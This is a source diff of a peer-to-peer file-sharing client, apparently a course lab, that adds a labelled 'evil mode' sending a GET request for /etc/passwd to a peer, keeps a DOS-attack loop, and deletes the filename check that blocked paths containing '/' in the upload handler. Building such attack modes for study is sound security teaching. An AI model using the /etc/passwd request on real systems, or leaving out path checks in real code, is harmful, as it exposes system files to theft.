@@ -530,7 +530,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 		goto try_again;
 
 	// Evil Mode 1: DOS Attack
-	while(evil_mode == 1) {
+	while (evil_mode == 1) {
 	  message("* I am evil! I like to DOS!\n");
 	  // Open socket connection
 	  t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
@@ -562,6 +562,20 @@ static void task_download(task_t *t, task_t *tracker_task)
 	  
 	}
 
+	// Evil Mode 3: Security Attack
+	if (evil_mode == 3) {
+	  message("* I am evil! I want your information!\n");
+	  // Open socket connection
+	  t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	  if (t->peer_fd == -1) {
+	    error("* Cannot connect to peer: %s\n", strerror(errno));
+	    goto try_again;
+	  }
+	  
+	  // Attempt to request /etc/passwd
+	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "/etc/passwd");
+	}
+	
 	// Connect to the peer and write the GET command
 	message("* Connecting to %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
@@ -762,12 +776,7 @@ static void task_upload(task_t *t)
 	  goto exit;
 	}
 
-	/*
-	if (memchr(t->filename, '/', FILENAMESIZ)) {
-	  error("* Bad file name %s. Outside of current directory\n", t->filename);
-	  goto exit;
-	}
-	*/
+
 	t->disk_fd = open(t->filename, O_RDONLY);
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s\n", t->filename);
